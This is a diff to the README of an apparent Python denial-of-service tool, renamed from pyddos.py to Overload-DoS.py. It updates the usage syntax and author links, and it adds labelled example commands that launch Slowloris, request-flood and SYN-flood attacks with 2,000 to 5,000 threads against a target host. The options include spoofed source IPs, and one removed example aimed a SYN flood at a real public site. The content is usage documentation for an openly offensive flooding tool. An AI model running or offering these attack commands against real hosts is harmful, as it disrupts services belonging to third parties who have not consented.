@@ -39,7 +39,7 @@ chmod +x *
 ```
 ## Usages
 ```
-usage: ./Overload-DoS.py -t [target] -p [port] -t [number threads]
+usage: ./Overload-DoS.py -target [target] -port [port] -threads [number threads]
 
 optional arguments:
   -h, --help           show this help message and exit
@@ -58,14 +58,17 @@ options:
   -fakeip              Option to create fake ip if not specifed for spoofed ip
 ```
 ## Examples
+Slowloris/SLOW attack method
 ```
-./pyddos.py -target www.example.com -port 80 -threads 2000 -slow
+./Overload-DoS.py -target www.target.com -port 80 -threads 2000 -slow
 ```
+Request/Requester attack method
 ```
-./pyddos.py -target www.domain.com -sleep 100 -request
+./Overload-DoS.py -target www.target.com -port 80 -threads 2000 -request
 ```
+SYN/6 flagged ICMP attack method
 ```
-./pyddos.py -target www.google.com -syn -threads 5000 -timeout 10.0
+./Overload-DoS.py -target www.target.com -syn -threads 5000
 ```
 ## Built With
 
@@ -78,7 +81,7 @@ options:
 
 ## Authors
 
-* **Chris Poole** - [codingplanets](https://github.com/codingplanets)
+* **Chris Poole** - Twitter:[@codingplanets](https://twitter.com/codingplanets) - Github:[codingplanets](https://github.com/codingplanets)
 
 
 ## License
